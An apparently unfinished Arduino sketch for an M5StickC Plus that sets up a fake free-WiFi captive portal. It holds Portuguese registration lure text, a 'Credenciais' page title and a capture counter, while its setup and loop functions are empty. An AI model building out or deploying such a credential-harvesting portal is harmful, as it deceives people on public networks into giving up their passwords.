#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

//config do user
#define SSID_NAME "WiFi do Foca"
#define SUBTITLE "Sistema de Internet Gratuita."
#define TITLE "Registre-se:"
#define BODY "Crie uma conta para liberar acesso ao sistema gratuito de WiFi do Foca."
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta esta sendo validada. Por favor, aguarde uma mensagem confirmando o cadastro em seu e-mail.</br>Muito Obrigada."
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Cleared"

int capcount=0;
int previous=-1; 
int BUILTIN_LED = 10;

//Settings do init do sistema

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

}
